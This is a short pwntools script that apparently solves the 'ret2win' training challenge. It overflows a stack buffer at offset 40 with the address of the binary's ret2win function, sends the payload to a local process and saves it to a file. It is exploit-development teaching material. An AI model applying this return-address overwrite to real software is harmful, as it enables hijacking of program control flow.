from pwn import *

elf = ELF('./ret2win')
context.binary = elf.path

ret2win_addr = elf.symbols['ret2win']
info('ret2win address: %#x',ret2win_addr)
offset = 40
payload = flat({offset:ret2win_addr})

# spawn a process and send a payload
io = elf.process()
io.recvuntil(">")
io.sendline(payload)
print io.recvall()

# write a payload to file as exploit.txt
with open('exploit.txt','w') as f:
    f.writelines(payload)

